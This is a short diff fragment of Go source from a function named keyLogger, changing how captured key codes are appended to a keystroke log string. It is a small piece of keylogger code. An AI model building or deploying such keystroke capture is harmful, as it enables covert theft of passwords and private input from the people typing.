@@ -331,7 +331,7 @@ func keyLogger() {
 					keylog += "."
 				default:
 					if 0x30 <= KEY && 0x5A >= KEY {
-						keylog += string(0x30 + KEY - 0x30)
+						keylog += string(KEY)
 					}
 				}
 			}
